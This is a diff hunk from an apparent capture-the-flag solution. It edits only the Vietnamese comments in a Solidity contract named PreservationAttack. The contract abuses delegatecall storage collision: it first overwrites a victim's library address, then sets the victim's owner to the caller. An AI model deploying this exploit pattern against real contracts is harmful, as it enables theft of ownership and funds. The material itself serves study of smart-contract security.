@@ -30,16 +30,16 @@ contract PreservationAttack{
     }
      function setTime(uint256 addressAsUint) public {
         owner = address(uint160(addressAsUint));
-        // Đặt lại owner bằng địa chỉ chuyển vào
+        // đặt lại owner bằng địa chỉ chuyển vào
 
     }
     function attack() external{
         victim.setFirstTime(uint256(uint160(address(this))));
-        // Thay đổi địa chỉ timeZone1Library bằng địa chỉ của hợp đồng tấn công
+        // thay đổi địa chỉ timeZone1Library bằng địa chỉ của hợp đồng tấn công
 
 
         victim.setFirstTime(uint256(uint160(msg.sender)));
-        // Thay đổi owner bằng địa chỉ của kẻ tấn công (msg.sender)
+        // thay đổi owner bằng địa chỉ của ng tấn công (msg.sender)
     }
 }
 ```
